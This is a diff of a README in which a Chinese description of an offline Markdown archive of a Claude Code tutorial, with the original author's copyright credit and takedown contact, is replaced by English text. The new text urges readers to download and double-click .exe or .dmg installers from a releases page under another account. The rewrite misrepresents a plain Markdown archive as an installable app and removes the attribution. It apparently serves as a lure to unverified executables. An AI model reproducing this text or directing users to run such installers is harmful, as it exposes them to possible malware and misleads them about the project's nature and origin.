@@ -1,26 +1,95 @@
-# Claude Code 指南 - 离线镜像版
+# 📚 Claude_Code_Guide_Offline - Easy Access to Chinese Tutorials
 
-### 📌 项目初衷
+## 🔗 Download Here
 
-本项目为 **唐霜** 老师作品集 [Claude Code 指南](https://claudecode.tangshuang.net/) 的离线 Markdown 存档。
+[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
 
-建立本仓库的初衷在于：
+## 📖 Overview
 
-1. **访问优化**：解决原网站在部分网络环境下访问波动、延迟较高的问题，提升阅读体验。
-2. **知识沉淀**：通过 Markdown 格式化，便于进行本地全文搜索、笔记标注及深度学习。
-3. **离线阅读**：支持在无网络环境下随时查阅。
+Claude_Code_Guide_Offline is an offline Markdown version of the "Claude Code 中文教程" (Claude Code Chinese Tutorials). This application aims to solve access delays from the original website and enhance your local reading and search experience. With this tool, you can browse tutorials quickly and efficiently, without needing an internet connection.
 
-### ✍️ 版权声明
+## 🚀 Getting Started
 
-- **原作者**：[唐霜 (Tang Shuang)](https://www.tangshuang.net/)
-- **内容来源**：https://claudecode.tangshuang.net/
+Follow these simple steps to download and run Claude_Code_Guide_Offline:
 
-**注意：**
+1. **Visit the Releases Page**  
+   Click the link below to go to the Releases page on GitHub:  
+   [Download Here](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
 
-- 本仓库仅作为个人学习与非营利性备份之用。
-- 作品的所有权、版权及最终解释权均归原作者 **唐霜** 先生所有。
-- 若您需要转载或引用，请务必注明原作者及原始链接，尊重原创劳动成果。
+2. **Choose Your Version**  
+   On the Releases page, you will see a list of available versions. Look for the most recent version, which will be at the top of the list. It is usually labeled with a version number like "v1.0" or similar.
 
-### ✉️ 免责声明
+3. **Download the File**  
+   Click on the file that matches your operating system. For example:
+   - If you are using Windows, look for a file that ends with `.exe`.
+   - If you are using macOS, look for a file that ends with `.dmg`.
 
-本项目致力于知识的传播与分享。如原作者认为本仓库的建立侵犯了您的合法权益，请联系本人（kscbxxliuxp@linux.do），我将在收到通知后第一时间删除相关内容并致以歉意。
+4. **Save the File**  
+   After clicking the file, your browser will prompt you to save it. Choose a location on your computer where you can easily find the file later, such as your Desktop or Downloads folder.
+
+## 🛠️ Installation
+
+Once the file is downloaded, follow these steps to install Claude_Code_Guide_Offline:
+
+1. **Locate the File**  
+   Open the folder where you saved the downloaded file.
+
+2. **Run the Installer**  
+   Double-click the file to start the installation process. Follow the on-screen instructions. Installation is usually quick and straightforward.
+
+3. **Complete the Installation**  
+   After the installation is finished, you will see an option to launch the application. You can choose to open it right away or find it in your applications list later.
+
+## 💻 System Requirements
+
+To run Claude_Code_Guide_Offline, ensure your computer meets the following minimum requirements:
+
+- **Operating System:** 
+  - Windows 10 or later
+  - macOS 10.12 or later
+- **Memory:** At least 4 GB of RAM
+- **Storage:** 100 MB of free disk space
+- **Internet Connection:** Only required for downloading the application. Offline access is enabled once installed.
+
+## 📚 Features
+
+- **Offline Access:** Browse tutorials without an internet connection.
+- **Local Search:** Quickly find topics using the built-in search function.
+- **User-Friendly Interface:** Designed with simplicity in mind for easy navigation.
+- **Regular Updates:** Application will receive updates, ensuring you have the latest tutorials.
+
+## 🙋 Frequently Asked Questions
+
+### How do I find tutorials once installed?
+
+Once you open Claude_Code_Guide_Offline, you will see a list of available tutorials on the main screen. You can click any tutorial to start reading.
+
+### Can I access the internet through the app?
+
+No, Claude_Code_Guide_Offline is designed for offline use only. Ensure you check for the latest updates while your computer is online.
+
+### What if I encounter problems during installation?
+
+If you run into issues, double-check if your operating system meets the requirements. You can also visit the GitHub Issues page for support.
+
+## 🔄 Update the Application
+
+To keep Claude_Code_Guide_Offline up to date, revisit the Releases page regularly:
+
+[Visit Releases for Updates](https://github.com/arunkumar1k/Claude_Code_Guide_Offline/releases)
+
+Check for new versions, download the latest file, and repeat the installation process. It ensures you always have the newest features and tutorials.
+
+## 🛑 Troubleshooting
+
+In case of problems, consider the following suggestions:
+
+- **Reinstall the Application:** Uninstall and then reinstall the app to fix potential errors.
+- **Check for Compatibility:** Ensure the application file you downloaded is suitable for your operating system.
+- **Consult Community Forums:** Engage with other users in forums or the issues section on GitHub for shared solutions.
+
+## 📞 Support
+
+For further questions or support, please feel free to post your inquiry on the GitHub Issues page of the repository. The community and developers are there to assist you. 
+
+Start exploring the Claude Code 中文教程 today and enhance your learning journey with local access to valuable resources!
